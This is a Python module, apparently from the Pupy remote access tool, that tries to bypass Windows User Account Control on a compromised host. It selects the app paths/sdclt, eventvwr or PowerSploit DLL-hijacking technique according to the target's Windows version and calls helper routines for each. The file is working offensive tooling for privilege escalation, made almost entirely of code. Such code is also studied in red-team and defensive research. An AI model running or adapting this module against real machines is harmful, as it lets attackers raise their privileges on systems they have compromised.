# -*- coding: UTF8 -*-
#Author: @bobsecq
#Contributor(s):

import os
from pupylib.PupyModule import *
from rpyc.utils.classic import upload
from modules.lib.windows.bypassuac import bypassuac
__class_name__="BypassUAC"

ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..",".."))

@config(compat="windows", category="privesc")
class BypassUAC(PupyModule):
    """try to bypass UAC """
    dependencies=["pupwinutils.processes", "pupwinutils.security"]

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="bypassuac", description=self.__doc__)
        self.arg_parser.add_argument('-m', dest='method', choices=["appPaths","eventvwr", "dll_hijacking"], default=None, help="By default, the method will be choosen for you: 'eventvwr' for wind7-8.1 and 'appPaths' for wind10. dll_hijacking method can be used for Windows 7/2008 and Windows 8/2012")

    def run(self, args):
        # check if a UAC Bypass can be done
        if not self.client.conn.modules["pupwinutils.security"].can_get_admin_access():
            self.error('Your are not on the local administrator group.')
            return

        appPathsMethod = False
        eventvwrMethod = False
        dllhijackingMethod = False

        bypassUasModule = bypassuac(self, rootPupyPath=ROOT)
        # choose methods depending on the OS Version
        if not args.method:
            if self.client.desc['release'] == '10':
                appPathsMethod = True
            else:
                dllhijackingMethod = True
        elif args.method == "appPaths":     
            appPathsMethod = True
        elif args.method == "eventvwr":     
            eventvwrMethod = True
        elif args.method == "dll_hijacking":     
            dllhijackingMethod = True

        if appPathsMethod:
            self.success("Trying to bypass UAC using the 'app paths'+'sdclt.exe' method, wind10 targets ONLY...")
            bypassUasModule.bypassuac_through_appPaths()
        if eventvwrMethod:
            self.success("Trying to bypass UAC using the Eventvwr method, wind7-10 targets...")
            bypassUasModule.bypassuac_through_eventVwrBypass()
        if dllhijackingMethod:
            # Invoke-BypassUAC.ps1 uses different technics to bypass depending on the Windows Version (Sysprep for Windows 7/2008 and NTWDBLIB.dll for Windows 8/2012)
            self.success("Trying to bypass UAC using DLL Hijacking, wind7-8.1 targets...")
            bypassUasModule.bypassuac_through_powerSploitBypassUAC()

